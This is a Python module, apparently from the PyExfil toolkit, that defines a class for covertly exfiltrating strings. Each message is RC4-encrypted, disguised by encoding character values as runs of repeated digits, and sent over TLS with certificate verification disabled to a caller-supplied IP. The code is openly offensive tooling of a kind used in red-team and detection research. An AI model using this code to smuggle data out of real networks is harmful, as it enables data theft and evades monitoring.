import sys
import ssl
import zlib
import socket

from pyexfil.includes.prepare import (
    PrepString,
    RebuildFile,
    _splitString,
    DecodePacket,
    rc4,
)

context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
context.verify_mode = ssl.CERT_NONE

BUFF = "\x00"


class PortNotAnInt(Exception):
    def __init__(self, message=""):
        self.message = message

    def __str__(self):
        return "Exception: %s." % self.message


class Send:
    def __init__(self, dest_ip, key, port, compress=False):
        """
        Send class to exfiltrate information
        :param dest_ip: Destination IP [string]
        :param key: Key for encryption [bytes]
        :param port: Port [int]
        :param compress: Compress or not [bool]
        """
        self.dest_ip = dest_ip
        if key is None:
            self.key = None
        else:
            self.key = str(key)
        self.port = port

        if type(self.port) is not int:
            raise PortNotAnInt("Port is not an int")

        self.sock = None
        self.compress = compress

    def _establish_connection(self):
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.settimeout(10)
        self.wrapped_socket = ssl.wrap_socket(self.sock, ssl_version=ssl.PROTOCOL_TLSv1)

        try:
            self.wrapped_socket.connect((self.dest_ip, self.port))
        except Exception as e:
            sys.stderr.write(
                "Could not connect to %s:%s.\n" % (self.dest_ip, self.port)
            )
            return False

        sys.stdout.write("Connected to %s:%s.\n" % (self.dest_ip, self.port))
        return True

    def send_string(self, message):

        # split into 2 bytes and prepare for sending
        data = PrepString(
            message.encode("utf-8"), max_size=2, enc_key=self.key, compress=False
        )
        pckts = data["Packets"]

        # make them into the format we want to send
        send_me = []
        for indx, pckt in enumerate(pckts):
            disPacket = ""
            for ndx, c in enumerate(str(pckt, "utf-8")):
                count = str(ord(c))
                disPacket += str(ndx) * int(count)
                disPacket += BUFF
            send_me.append(disPacket)

        # establish connection
        check = self._establish_connection()
        if not check:
            return False

        for packet in send_me:
            dis_data = bytes(packet, "utf-8")
            self.wrapped_socket.send(dis_data)

        self.wrapped_socket.close()
        self.wrapped_socket = None
        self.sock.close()
        self.sock = None
        return True, send_me

    def Decode(self, decode_me):
        if type(decode_me) is not list:
            sys.stderr.write("'decode_me' needs to be a list type.\n")
            return False

        # Recompile data
        data = ""
        for indx, packet in enumerate(decode_me):

            if packet.find(BUFF) == -1:
                sys.stderr.write("Packet %s does not have a terminator.\n" % indx)
                return False

            for ch in packet.split(BUFF)[:-1]:
                data += chr(len(ch))

        # Decrypt:
        if self.key is None:
            data = data
        else:
            data = rc4(data, self.key)

        if self.compress:
            try:
                data = zlib.decompress(data)
            except Exception as e:
                sys.stderr.write("Cannot decompress data: %s.\n" % e)
                return False
        else:
            pass

        return data


class Listen:
    pass
